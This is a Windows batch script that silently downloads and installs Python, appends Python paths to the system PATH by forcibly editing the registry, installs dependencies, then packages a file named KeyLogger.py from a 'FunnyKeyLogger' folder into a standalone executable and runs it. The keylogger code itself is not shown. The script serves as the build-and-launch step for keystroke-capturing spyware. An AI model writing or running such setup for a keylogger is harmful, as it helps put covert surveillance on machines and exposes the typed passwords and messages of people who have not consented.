@echo off

:: Download and silently install Python
curl https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe -o python_install.exe

python_install.exe /quiet InstallAllUsers=1 PrependPath=1

:: Adding pip and Python to the system PATH by modifying the system registry
set "PYTHON_PATH=C:\Python310"
set "SCRIPTS_PATH=C:\Python310\Scripts"

:: Fetch the current system PATH from the registry and append Python and Scripts paths
for /f "tokens=2*" %%A in ('reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path') do set "currentPath=%%B"
set "newPath=%currentPath%;%PYTHON_PATH%;%SCRIPTS_PATH%"

:: Update the system environment variable in the registry
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path /d "%newPath%" /f

:: Notify that system environment variables were updated
echo System PATH updated with Python and pip directories.

:: Install dependencies using pip
pip install -r requirements.txt

:: Set the desktop path and navigate to FunnyKeyLogger folder
set desktopPath=%USERPROFILE%\Desktop
cd /d %desktopPath%\FunnyKeyLogger

:: Use pyinstaller to package the KeyLogger.py file
pyinstaller --onefile KeyLogger.py

:: Navigate to the dist folder and run the executable
cd /d %desktopPath%\FunnyKeyLogger\dist\
KeyLogger.exe

pause

